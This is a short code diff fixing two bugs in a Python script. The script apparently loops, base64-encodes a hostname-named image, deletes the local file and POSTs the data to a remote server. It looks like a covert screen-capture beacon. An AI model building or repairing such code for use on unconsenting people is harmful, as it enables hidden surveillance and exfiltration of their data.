@@ -5,7 +5,7 @@ import base64
 import socket
 
 try:
-    arch = subprocess.run(['uname', '-m'])
+    arch = subprocess.check_output(['uname', '-m'])
 except FileNotFoundError:
     arch = None
 
@@ -33,7 +33,7 @@ while arch:
             img = base64.b64encode(img).decode()
             _obj['file'] = img
         subprocess.run(['rm', '{}.jpg'.format(hostname)])
-    pythoconn = http.HTTPConnection("{}:80".format(server_ip))
+    conn = http.HTTPConnection("{}:80".format(server_ip))
     _obj = json.dumps(_obj)
     _obj = _obj.encode()
     conn.request("POST", server_path, _obj, headers)
